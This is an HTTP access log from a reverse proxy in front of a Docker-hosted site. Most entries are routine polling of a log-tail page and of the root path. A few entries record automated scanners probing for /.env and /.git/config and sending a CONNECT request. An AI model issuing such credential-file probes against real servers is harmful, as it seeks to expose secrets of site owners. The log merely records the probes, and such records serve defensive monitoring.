173.48.140.140 - - [19/Dec/2023:03:53:22 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4603 "-" "-" 7664 "www@docker" "http://172.18.0.9:80" 40ms
173.48.140.140 - - [19/Dec/2023:03:53:26 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4654 "-" "-" 7665 "www@docker" "http://172.18.0.9:80" 26ms
173.48.140.140 - - [19/Dec/2023:03:53:26 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4709 "-" "-" 7666 "www@docker" "http://172.18.0.9:80" 30ms
173.48.140.140 - - [19/Dec/2023:03:53:27 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4760 "-" "-" 7667 "www@docker" "http://172.18.0.9:80" 36ms
173.48.140.140 - - [19/Dec/2023:03:53:28 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4676 "-" "-" 7668 "www@docker" "http://172.18.0.9:80" 29ms
173.48.140.140 - - [19/Dec/2023:03:53:29 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4731 "-" "-" 7669 "www@docker" "http://172.18.0.9:80" 28ms
173.48.140.140 - - [19/Dec/2023:03:53:30 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4785 "-" "-" 7670 "www@docker" "http://172.18.0.9:80" 29ms
173.48.140.140 - - [19/Dec/2023:03:53:30 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4836 "-" "-" 7671 "www@docker" "http://172.18.0.9:80" 24ms
173.48.140.140 - - [19/Dec/2023:03:53:30 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4752 "-" "-" 7672 "www@docker" "http://172.18.0.9:80" 28ms
173.48.140.140 - - [19/Dec/2023:03:53:31 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4807 "-" "-" 7673 "www@docker" "http://172.18.0.9:80" 23ms
173.48.140.140 - - [19/Dec/2023:03:53:31 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4858 "-" "-" 7674 "www@docker" "http://172.18.0.9:80" 29ms
173.48.140.140 - - [19/Dec/2023:03:53:32 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4913 "-" "-" 7675 "www@docker" "http://172.18.0.9:80" 30ms
173.48.140.140 - - [19/Dec/2023:03:53:32 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4964 "-" "-" 7676 "www@docker" "http://172.18.0.9:80" 28ms
173.48.140.140 - - [19/Dec/2023:03:53:32 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4880 "-" "-" 7677 "www@docker" "http://172.18.0.9:80" 33ms
173.48.140.140 - - [19/Dec/2023:03:53:33 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4935 "-" "-" 7678 "www@docker" "http://172.18.0.9:80" 33ms
173.48.140.140 - - [19/Dec/2023:03:53:33 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4953 "-" "-" 7679 "www@docker" "http://172.18.0.9:80" 33ms
173.48.140.140 - - [19/Dec/2023:03:53:34 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4950 "-" "-" 7680 "www@docker" "http://172.18.0.9:80" 29ms
173.48.140.140 - - [19/Dec/2023:03:53:34 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4971 "-" "-" 7681 "www@docker" "http://172.18.0.9:80" 28ms
173.48.140.140 - - [19/Dec/2023:03:53:35 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 5022 "-" "-" 7682 "www@docker" "http://172.18.0.9:80" 30ms
167.71.120.76 - - [19/Dec/2023:03:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7683 "www@docker" "http://172.18.0.9:80" 2ms
173.48.140.140 - - [19/Dec/2023:03:53:39 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 5212 "-" "-" 7684 "www@docker" "http://172.18.0.9:80" 34ms
173.48.140.140 - - [19/Dec/2023:03:53:41 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 9634 "-" "-" 7685 "www@docker" "http://172.18.0.9:80" 63ms
173.48.140.140 - - [19/Dec/2023:03:53:59 +0000] "GET /logs/logtail.php HTTP/2.0" 200 4956 "-" "-" 7686 "www@docker" "http://172.18.0.9:80" 30ms
173.48.140.140 - - [19/Dec/2023:03:54:05 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4949 "-" "-" 7687 "www@docker" "http://172.18.0.9:80" 22ms
173.48.140.140 - - [19/Dec/2023:03:54:19 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 5139 "-" "-" 7688 "www@docker" "http://172.18.0.9:80" 36ms
159.203.109.206 - - [19/Dec/2023:03:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7689 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:03:54:25 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 9704 "-" "-" 7690 "www@docker" "http://172.18.0.9:80" 45ms
167.71.120.76 - - [19/Dec/2023:03:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7691 "www@docker" "http://172.18.0.9:80" 0ms
185.224.128.142 - - [19/Dec/2023:03:54:59 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7692 "-" "-" 0ms
185.224.128.142 - - [19/Dec/2023:03:54:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7693 "web-to-websecure@internal" "-" 0ms
185.224.128.142 - - [19/Dec/2023:03:55:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7694 "-" "-" 0ms
185.224.128.191 - - [19/Dec/2023:03:55:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7695 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7696 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7697 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7698 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:03:56:25 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 417 "-" "-" 7699 "www@docker" "http://172.18.0.9:80" 11ms
173.48.140.140 - - [19/Dec/2023:03:56:32 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 332 "-" "-" 7700 "www@docker" "http://172.18.0.9:80" 8ms
167.71.120.76 - - [19/Dec/2023:03:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7701 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:03:56:42 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 143 "-" "-" 7702 "www@docker" "http://172.18.0.9:80" 3ms
173.48.140.140 - - [19/Dec/2023:03:56:46 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 656 "-" "-" 7703 "www@docker" "http://172.18.0.9:80" 6ms
159.203.109.206 - - [19/Dec/2023:03:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7704 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7705 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7706 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7707 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7708 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7709 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7710 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7711 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7712 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:01:25 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 5534 "-" "-" 7713 "www@docker" "http://172.18.0.9:80" 38ms
173.48.140.140 - - [19/Dec/2023:04:01:32 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 333 "-" "-" 7714 "www@docker" "http://172.18.0.9:80" 3ms
167.71.120.76 - - [19/Dec/2023:04:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7715 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:01:38 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 467 "-" "-" 7716 "www@docker" "http://172.18.0.9:80" 3ms
173.48.140.140 - - [19/Dec/2023:04:01:41 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 467 "-" "-" 7717 "www@docker" "http://172.18.0.9:80" 5ms
173.48.140.140 - - [19/Dec/2023:04:01:41 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 521 "-" "-" 7718 "www@docker" "http://172.18.0.9:80" 7ms
173.48.140.140 - - [19/Dec/2023:04:01:43 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 521 "-" "-" 7719 "www@docker" "http://172.18.0.9:80" 5ms
173.48.140.140 - - [19/Dec/2023:04:01:44 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 521 "-" "-" 7720 "www@docker" "http://172.18.0.9:80" 5ms
173.48.140.140 - - [19/Dec/2023:04:01:47 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 5535 "-" "-" 7721 "www@docker" "http://172.18.0.9:80" 36ms
173.48.140.140 - - [19/Dec/2023:04:01:51 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 8513 "-" "-" 7722 "www@docker" "http://172.18.0.9:80" 45ms
159.203.109.206 - - [19/Dec/2023:04:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7723 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7724 "www@docker" "http://172.18.0.9:80" 1ms
57.129.23.166 - - [19/Dec/2023:04:03:06 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7725 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:04:03:06 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7726 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7727 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7728 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7729 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7730 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7731 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7732 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7733 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7734 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7735 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7736 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7737 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7738 "www@docker" "http://172.18.0.9:80" 0ms
167.94.138.33 - - [19/Dec/2023:04:08:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7739 "-" "-" 0ms
167.94.138.33 - - [19/Dec/2023:04:08:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7740 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7741 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7742 "www@docker" "http://172.18.0.9:80" 1ms
90.151.171.106 - - [19/Dec/2023:04:09:58 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 7743 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [19/Dec/2023:04:10:09 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 7744 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7745 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7746 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:11:06 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 499 21 "-" "-" 7747 "www@docker" "http://172.18.0.9:80" 8249ms
173.48.140.140 - - [19/Dec/2023:04:11:14 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 499 21 "-" "-" 7748 "www@docker" "http://172.18.0.9:80" 2061ms
159.203.109.206 - - [19/Dec/2023:04:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7750 "www@docker" "http://172.18.0.9:80" 3ms
167.71.120.76 - - [19/Dec/2023:04:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7751 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:11:20 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 504 569 "-" "-" 7749 "www@docker" "http://172.18.0.9:80" 60049ms
159.203.109.206 - - [19/Dec/2023:04:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7752 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7753 "www@docker" "http://172.18.0.9:80" 0ms
170.64.200.251 - - [19/Dec/2023:04:12:36 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 7754 "web-to-websecure@internal" "-" 0ms
170.64.200.251 - - [19/Dec/2023:04:12:38 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 7755 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7756 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7757 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7758 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7759 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7760 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7761 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7762 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7763 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7764 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7765 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7766 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7767 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7768 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:19:33 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2676 "-" "-" 7769 "www@docker" "http://172.18.0.9:80" 309ms
167.71.120.76 - - [19/Dec/2023:04:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7770 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:19:40 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2398 "-" "-" 7771 "www@docker" "http://172.18.0.9:80" 31ms
173.48.140.140 - - [19/Dec/2023:04:19:45 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2441 "-" "-" 7772 "www@docker" "http://172.18.0.9:80" 21ms
173.48.140.140 - - [19/Dec/2023:04:19:49 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2662 "-" "-" 7773 "www@docker" "http://172.18.0.9:80" 26ms
173.48.140.140 - - [19/Dec/2023:04:19:52 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 2504 "-" "-" 7774 "www@docker" "http://172.18.0.9:80" 29ms
173.48.140.140 - - [19/Dec/2023:04:19:55 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 2942 "-" "-" 7775 "www@docker" "http://172.18.0.9:80" 26ms
159.203.109.206 - - [19/Dec/2023:04:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7776 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7777 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7778 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7779 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:04:21:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7780 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7781 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7782 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7783 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7784 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7785 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7786 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7787 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7788 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7789 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7790 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7791 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7792 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:04:27:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7793 "web-to-websecure@internal" "-" 0ms
69.164.217.245 - - [19/Dec/2023:04:27:53 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7794 "-" "-" 0ms
172.105.128.11 - - [19/Dec/2023:04:28:19 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7795 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7796 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7797 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.111 - - [19/Dec/2023:04:29:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7798 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7799 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:29:34 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 143 "-" "-" 7800 "www@docker" "http://172.18.0.9:80" 9ms
167.71.120.76 - - [19/Dec/2023:04:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7801 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:29:38 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 143 "-" "-" 7802 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:29:52 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 143 "-" "-" 7803 "www@docker" "http://172.18.0.9:80" 3ms
173.48.140.140 - - [19/Dec/2023:04:29:55 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 143 "-" "-" 7804 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:29:57 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 143 "-" "-" 7805 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [19/Dec/2023:04:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7806 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:30:25 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 143 "-" "-" 7807 "www@docker" "http://172.18.0.9:80" 3ms
173.48.140.140 - - [19/Dec/2023:04:30:29 +0000] "GET /logs/logtail.php HTTP/2.0" 200 143 "-" "-" 7808 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:30:33 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 143 "-" "-" 7809 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7810 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:30:50 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2762 "-" "-" 7811 "www@docker" "http://172.18.0.9:80" 25ms
173.48.140.140 - - [19/Dec/2023:04:31:06 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2806 "-" "-" 7812 "www@docker" "http://172.18.0.9:80" 31ms
173.48.140.140 - - [19/Dec/2023:04:31:07 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2857 "-" "-" 7813 "www@docker" "http://172.18.0.9:80" 21ms
173.48.140.140 - - [19/Dec/2023:04:31:09 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2912 "-" "-" 7814 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [19/Dec/2023:04:31:09 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2956 "-" "-" 7815 "www@docker" "http://172.18.0.9:80" 15ms
173.48.140.140 - - [19/Dec/2023:04:31:13 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 3007 "-" "-" 7816 "www@docker" "http://172.18.0.9:80" 16ms
159.203.109.206 - - [19/Dec/2023:04:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7817 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7818 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:31:46 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2958 "-" "-" 7819 "www@docker" "http://172.18.0.9:80" 27ms
173.48.140.140 - - [19/Dec/2023:04:31:47 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2959 "-" "-" 7820 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [19/Dec/2023:04:31:49 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2960 "-" "-" 7821 "www@docker" "http://172.18.0.9:80" 29ms
159.203.109.206 - - [19/Dec/2023:04:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7822 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7823 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:32:52 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1307 "-" "-" 7824 "www@docker" "http://172.18.0.9:80" 15ms
173.48.140.140 - - [19/Dec/2023:04:33:02 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1603 "-" "-" 7825 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [19/Dec/2023:04:33:11 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 1592 "-" "-" 7826 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [19/Dec/2023:04:33:15 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 1547 "-" "-" 7827 "www@docker" "http://172.18.0.9:80" 13ms
159.203.109.206 - - [19/Dec/2023:04:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7828 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7829 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:34:19 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 1545 "-" "-" 7830 "www@docker" "http://172.18.0.9:80" 19ms
159.203.109.206 - - [19/Dec/2023:04:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7831 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:34:30 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 1545 "-" "-" 7832 "www@docker" "http://172.18.0.9:80" 15ms
173.48.140.140 - - [19/Dec/2023:04:34:32 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 1546 "-" "-" 7833 "www@docker" "http://172.18.0.9:80" 12ms
54.37.79.75 - - [19/Dec/2023:04:34:32 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7834 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:04:34:32 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7835 "web-to-websecure@internal" "-" 0ms
